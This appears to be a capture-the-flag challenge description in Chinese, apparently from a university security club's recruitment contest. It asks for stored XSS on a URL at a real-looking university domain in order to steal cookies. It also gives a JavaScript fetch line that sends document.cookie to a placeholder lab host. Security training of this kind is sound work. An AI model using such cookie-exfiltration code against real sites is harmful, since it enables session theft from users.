## Realworld XSS


目标：在"https://i.hdu.edu.cn/mnews/_web/_ids/user/api/userInfo/edit0.rst?act=control&_p=YXM9MA__"实现存储型XSS窃取Cookie，然后在该网址的console执行下面的指令唤醒机器人访问

```js
fetch('https://YOUR-LAB-HOST/?cookie=' + document.cookie,{mode: 'no-cors'})
```

注意：请先访问https协议下的靶机接受SSL证书。

该附件允许你搭建在本地运行的环境，但其中的代码与挑战并没有太大关联。建议自己测试成功后再唤醒机器人。

任何问题可以找招新群`web-弟中之弟`询问

P.S. 镜像除环境变量外即为发布到dockerhub上的jesselingard/realworld_xss版本。题目不会窃取你的个人信息

